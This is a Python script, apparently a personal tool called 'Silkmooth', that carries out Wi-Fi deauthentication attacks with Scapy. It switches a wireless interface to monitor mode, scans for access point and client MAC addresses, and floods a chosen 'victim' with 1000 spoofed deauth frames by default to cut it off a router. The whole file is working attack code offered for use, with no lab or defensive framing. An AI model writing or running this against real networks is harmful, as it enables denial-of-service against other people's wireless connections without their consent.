import argparse
import subprocess
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

def enable_monitor_mode(interface):
    try:
        print(f"[!] Enabling monitor mode on {interface}...")
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["sudo", "iw", interface, "set", "monitor", "control"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
        print(f"[+] {interface} is now in monitor mode.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to set monitor mode: {e}")
        sys.exit(1)

def sniff_macs(interface, duration=10):
    aps = set()
    clients = set()

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype == 8:
                aps.add(pkt.addr2)
            elif pkt.type == 2:
                clients.add(pkt.addr1)

    print(f"[+] Scanning for Wi-Fi devices on {interface} for {duration} seconds...")
    sniff(iface=interface, prn=packet_handler, timeout=duration, monitor=True)

    print("\n[Access Points]")
    for ap in aps:
        print(f"  {ap}")

    print("\n[Clients]")
    for client in clients:
        print(f"  {client}")

def send_deauth(target_mac, router_mac, iface="wlan0", packet_count=1000):
    dot11 = Dot11(addr1=target_mac, addr2=router_mac, addr3=router_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    print(f"[+] Sending {packet_count} deauth packets to {target_mac} from {router_mac} on {iface}")
    sendp(packet, inter=0.1, count=packet_count, iface=iface, verbose=1)

if __name__ == "__main__":
    ascii_art = r"""
.▄▄ · ▪  ▄▄▌  ▄ •▄ • ▌ ▄ ·.       ▄▄▄▄▄ ▄ .▄
▐█ ▀. ██ ██•  █▌▄▌▪·██ ▐███▪▪     •██  ██▪▐█
▄▀▀▀█▄▐█·██▪  ▐▀▀▄·▐█ ▌▐▌▐█· ▄█▀▄  ▐█.▪██▀▐█
▐█▄▪▐█▐█▌▐█▌▐▌▐█.█▌██ ██▌▐█▌▐█▌.▐▌ ▐█▌·██▌▐▀
 ▀▀▀▀ ▀▀▀.▀▀▀ ·▀  ▀▀▀  █▪▀▀▀ ▀█▄▀▪ ▀▀▀ ▀▀▀ ·
                                          
        Wi-Fi Deauthentication Tool
         By Panagiotis Fassaris
"""
    print(ascii_art)

    parser = argparse.ArgumentParser(description="Wi-Fi Deauthentication Attack Script")
    parser.add_argument("target_mac", nargs="?", help="MAC address of the target device (victim)")
    parser.add_argument("router_mac", nargs="?", help="MAC address of the router (access point)")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wireless interface to use (default: wlan0)")
    parser.add_argument("-p", "--packets", type=int, default=1000, help="Number of deauth packets to send (default: 1000)")
    parser.add_argument("--auto-monitor", action="store_true", help="Automatically enable monitor mode on the interface")
    parser.add_argument("--scan", action="store_true", help="Scan for available APs and clients")

    args = parser.parse_args()

    if args.auto_monitor:
        enable_monitor_mode(args.interface)
    else:
        confirm = input(f"Do you want to enable monitor mode on {args.interface}? [y/N]: ").strip().lower()
        if confirm == 'y':
            enable_monitor_mode(args.interface)

    if args.scan:
        sniff_macs(args.interface)
        sys.exit(0)

    if not args.target_mac or not args.router_mac:
        print("[!] You must provide both target and router MAC addresses unless using --scan mode.")
        sys.exit(1)

    send_deauth(args.target_mac, args.router_mac, iface=args.interface, packet_count=args.packets)
